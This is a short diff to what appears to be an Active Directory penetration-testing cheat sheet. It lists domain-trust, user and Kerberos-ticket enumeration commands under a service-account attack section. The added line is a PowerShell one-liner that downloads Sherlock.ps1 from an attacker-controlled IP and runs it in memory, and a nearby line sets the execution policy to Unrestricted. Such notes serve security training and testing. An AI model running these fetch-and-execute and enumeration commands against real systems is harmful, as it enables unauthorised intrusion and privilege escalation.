@@ -65,6 +65,7 @@ nltest /domain_trusts   # show inbound/outbound trust
 Get-ADUser -Filter * | select SamAccountName    # list users(name ending with $ indicate trust keys being stored)
 Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName    # to retrieve user and computer accounts(ending with $)
 Set-ExecutionPolicy Unrestricted
+powershell "iex(new-object net.webclient).downloadString('http://192.168.119.218/Sherlock.ps1');Find-AllVulns"
 klist   # list the cached Kerberos tickets
 
 ----------Service Account Attack------------
